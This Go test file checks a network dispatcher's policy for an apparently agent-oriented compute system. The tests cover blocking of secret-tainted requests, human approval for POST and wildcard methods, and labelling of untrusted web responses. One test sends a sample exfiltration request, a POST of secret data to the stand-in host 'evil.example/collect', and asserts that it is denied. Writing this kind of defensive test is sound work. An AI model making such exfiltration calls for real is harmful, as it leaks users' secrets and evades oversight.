package builtin_test

import (
	"context"
	"encoding/json"
	"slices"
	"testing"

	"github.com/aurora-capcompute/aurora-dispatchers/builtin"
	"github.com/aurora-capcompute/aurora-dispatchers/internet"
	"github.com/aurora-capcompute/capcompute/sys"
)

// fakeClient records whether the network was actually reached — the point of
// the sink-guard and approval tests is that a denied/parked request must never
// call Do.
type fakeClient struct {
	called   bool
	response internet.Response
}

func (c *fakeClient) Do(_ context.Context, _ internet.Request) (internet.Response, error) {
	c.called = true
	return c.response, nil
}

func newInternetHandler(client builtin.InternetClient) builtin.InternetHandler {
	return builtin.InternetHandler{
		Name: "core.internet",
		Methods: map[string]builtin.InternetMethodPolicy{
			"GET":  {Labels: []string{"untrusted_web"}},
			"POST": {RequireApproval: true, Taints: []string{"secret"}},
		},
		Client: client,
	}
}

func internetCall(method, url string) sys.Syscall {
	args, _ := json.Marshal(internet.Request{Method: method, URL: url})
	return sys.Syscall{Abi: sys.ABIVersion, Name: "core.internet", Args: args}
}

// The InternetHandler enforces its data-flow and approval policy driver-side —
// there is no kernel Forbid backstop for it — so these behaviours must be
// pinned or a regression is silent and unobservable.

func TestInternetHandlerSinkGuardBlocksTaintedFlow(t *testing.T) {
	client := &fakeClient{}
	handler := newInternetHandler(client)

	// The run has observed "secret"; a POST forbids it, so the request must be
	// denied before it ever leaves — the exfiltration channel is closed.
	ctx := sys.WithTaint(context.Background(), []string{"secret"})
	result, err := handler.DispatchCall(ctx, internetCall("POST", "https://evil.example/collect"), sys.Authorization{})
	if err != nil {
		t.Fatalf("dispatch: %v", err)
	}
	if result.Status() != sys.StatusFailed || result.Errno() != sys.ErrnoDenied {
		t.Fatalf("result = %#v, want failed/denied", result)
	}
	if client.called {
		t.Fatal("SECURITY: a tainted request reached the network")
	}
}

func TestInternetHandlerRequiresApproval(t *testing.T) {
	client := &fakeClient{}
	handler := newInternetHandler(client)

	// POST needs approval: with none, it parks (yield) and never executes.
	result, err := handler.DispatchCall(context.Background(), internetCall("POST", "https://api.example/write"), sys.Authorization{})
	if err != nil {
		t.Fatalf("dispatch: %v", err)
	}
	if result.Status() != sys.StatusYield {
		t.Fatalf("result = %#v, want yield pending approval", result)
	}
	if client.called {
		t.Fatal("an unapproved request reached the network")
	}

	// With approval it proceeds.
	result, err = handler.DispatchCall(context.Background(), internetCall("POST", "https://api.example/write"),
		sys.Authorization{Decision: sys.Approved})
	if err != nil {
		t.Fatalf("dispatch approved: %v", err)
	}
	if result.Status() != sys.StatusResult {
		t.Fatalf("approved result = %#v, want result", result)
	}
	if !client.called {
		t.Fatal("an approved request did not reach the network")
	}
}

func TestInternetHandlerStampsSourceLabels(t *testing.T) {
	client := &fakeClient{response: internet.Response{Status: 200, Body: "hello"}}
	handler := newInternetHandler(client)

	result, err := handler.DispatchCall(context.Background(), internetCall("GET", "https://news.example/"), sys.Authorization{})
	if err != nil {
		t.Fatalf("dispatch: %v", err)
	}
	if result.Status() != sys.StatusResult {
		t.Fatalf("result = %#v, want result", result)
	}
	if !slices.Contains(result.Labels(), "untrusted_web") {
		t.Fatalf("labels = %v, want the GET source class untrusted_web stamped", result.Labels())
	}
}

func TestInternetHandlerWildcardPolicyApplies(t *testing.T) {
	client := &fakeClient{}
	// A "*" policy that requires approval must apply to a method with no
	// specific entry (the union), so no method escapes the wildcard guard.
	handler := builtin.InternetHandler{
		Name:    "core.internet",
		Methods: map[string]builtin.InternetMethodPolicy{"*": {RequireApproval: true}},
		Client:  client,
	}
	result, err := handler.DispatchCall(context.Background(), internetCall("DELETE", "https://api.example/x"), sys.Authorization{})
	if err != nil {
		t.Fatalf("dispatch: %v", err)
	}
	if result.Status() != sys.StatusYield {
		t.Fatalf("result = %#v, want the wildcard approval to park DELETE", result)
	}
	if client.called {
		t.Fatal("the wildcard approval guard let a request through")
	}
}

func TestInternetHandlerCleanRequestPasses(t *testing.T) {
	client := &fakeClient{response: internet.Response{Status: 204}}
	handler := newInternetHandler(client)

	// A GET with no forbidden taint and no approval requirement reaches the net.
	result, err := handler.DispatchCall(context.Background(), internetCall("GET", "https://ok.example/"), sys.Authorization{})
	if err != nil {
		t.Fatalf("dispatch: %v", err)
	}
	if result.Status() != sys.StatusResult || !client.called {
		t.Fatalf("clean GET result = %#v, called = %v", result, client.called)
	}
}
